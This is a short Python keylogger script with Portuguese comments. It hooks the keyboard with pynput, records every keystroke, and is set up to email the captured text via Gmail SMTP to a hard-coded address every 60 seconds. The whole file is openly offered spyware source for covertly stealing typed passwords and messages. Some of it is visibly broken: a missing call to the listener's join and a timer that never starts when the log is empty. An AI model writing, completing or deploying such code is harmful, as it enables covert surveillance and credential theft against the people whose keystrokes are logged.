from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer 

# CONFIGURAÇÕES DE EMAIL
EMAIL_ORIGEM = "eddusect@gmail.com"
EMAIL_DESTINO = "eddusect@gmail.com"
SENHA_EMAIL = "your_app_password_here"  # Use uma senha de app para maior segurança

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'Keylogger Report'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                server.login(EMAIL_ORIGEM, SENHA_EMAIL)
                server.sendmail(EMAIL_ORIGEM, EMAIL_DESTINO, msg.as_string())
            print("Email enviado com sucesso!")
        except Exception as e:
            print(f"Falha ao enviar email: {e}")
        finally:
            log = ""

        # Agendar o envio a cada 60 segundos
        Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += " "
        elif key == keyboard.Key.esc:
            log += " [ESC] "
        else:
            log += f"[{key}]"

log = ""
enviar_email()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join
